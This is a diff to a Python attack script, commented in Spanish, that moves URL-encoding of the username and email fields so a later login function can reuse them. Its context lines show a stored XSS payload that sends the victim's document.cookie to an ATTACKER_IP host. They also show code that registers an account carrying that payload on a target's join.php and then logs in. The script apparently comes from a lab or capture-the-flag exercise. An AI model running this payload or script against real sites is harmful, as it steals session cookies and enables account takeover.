@@ -22,6 +22,9 @@ XSS_PAYLOAD = f"<script>document.location='http://{ATTACKER_IP}:{PORT}/?c='+docu
 USERNAME = XSS_PAYLOAD
 EMAIL = f"random@example{PORT}.com"
 PASSWORD = "1234"
+  # Url-encoded las variabkes USERNAME y  EMAIL para pasarlos por la url
+encoded_username = urllib.parse.quote(USERNAME)
+encoded_email = urllib.parse.quote(EMAIL)
 
 print(f"Username : {USERNAME}, MAIL : {EMAIL}")
 
@@ -30,11 +33,6 @@ print(f"Username : {USERNAME}, MAIL : {EMAIL}")
 def register_user():
     print("[+] Registrando usuario con payload XSS...")
     
-    # Url-encodea las variabkes USERNAME y  EMAIL para pasarlos por la url
-    encoded_username = urllib.parse.quote(USERNAME)
-    encoded_email = urllib.parse.quote(EMAIL)
-
-
     url = f"{TARGET_URL}/join.php?username={encoded_username}&email={encoded_email}&password={PASSWORD}&registerForm=Register"
     
     headers = {
@@ -66,6 +64,7 @@ def login_user():
     print(f"[+] Iniciando sesión con {session_cookie}")
     
     url = f"{TARGET_URL}/join.php?loginUsername={encoded_username}&loginPassword={PASSWORD}&loginForm=Login"
+    
     
     headers = {
         "User-Agent": "Mozilla/5.0",
